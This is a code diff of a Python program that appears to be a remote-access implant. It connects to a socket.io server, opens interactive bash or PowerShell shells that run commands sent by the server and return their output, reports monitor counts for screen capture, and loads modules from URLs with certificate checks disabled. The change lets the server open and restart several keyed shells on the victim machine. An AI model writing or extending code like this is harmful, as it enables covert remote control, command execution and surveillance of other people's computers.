@@ -33,6 +33,9 @@ screen_number = 1
 screen_fps = 60
 screen_qualtiy = 20
 
+# Dictionary to store shells by key
+shells = {}
+
 def run(data):
     def create_module(url):
         # Create an SSL context that doesn't verify certificates
@@ -52,20 +55,12 @@ def run(data):
 
     system = platform.system()
 
-    global shell
-
-    if system == "Linux" or system == "Darwin":
-        shellScript = "bash"
-    elif system == "Windows":
-        shellScript = "powershell"
-    else:
-        shellScript = "sh"
-
     class InteractiveShell:
-        def __init__(self):
+        def __init__(self, key):
             self.process = None
             self.master_fd = None  # Master file descriptor for PTY on Unix systems
             self.running = False
+            self.key = key
 
         def start(self):
             self.running = True
@@ -106,17 +101,13 @@ def run(data):
                         .decode(errors="ignore")
                     )
                     if output:
-                        sio.emit("result", output)
+                        sio.emit("result", {"key": self.key, "output": output})
                 except OSError:
                     break
 
         def read_output_windows(self):
             while self.process.isalive():
-                sio.emit("result", self.process.read())
-
-        def read_err_windows(self):
-            while self.running:
-                sio.emit("result", process.read())
+                sio.emit("result", {"key": self.key, "output": self.process.read()})
 
         def write_input(self, command):
             if os.name == "posix":
@@ -126,18 +117,25 @@ def run(data):
 
     @sio.on("command")
     def command(data_new):
+        key = data_new["key"]
+        if key not in shells:
+            shells[key] = InteractiveShell(key)
+            shells[key].start()
+        
+        shell = shells[key]
         if data["uid"] == data_new["uid"]:
             shell.write_input(data_new["cmd"])
 
     @sio.on("restart")
     def restart(data_new):
-        global shell  # Declare shell as global to modify it
-        if data_new == data["uid"]:
+        key = data_new["key"]
+        if key in shells:
+            shell = shells[key]
             if shell.process:
                 shell.process.terminate()
                 shell.running = False
-            shell = InteractiveShell()  # Create a new InteractiveShell instance
-            shell.start()  # Start the new shell process
+            shells[key] = InteractiveShell(key)  # Create a new InteractiveShell instance
+            shells[key].start()  # Start the new shell process
 
     @sio.event
     def connect():
@@ -448,8 +446,5 @@ def run(data):
                 else:
                     sio.emit('screen_count', { 'uid': data['uid'], 'screen_count': len(sct.monitors)-1 })
 
-    sio.connect(data["url"])
-
-    shell = InteractiveShell()
-    shell.start()
+    sio.connect(data["url"])      
     sio.wait()
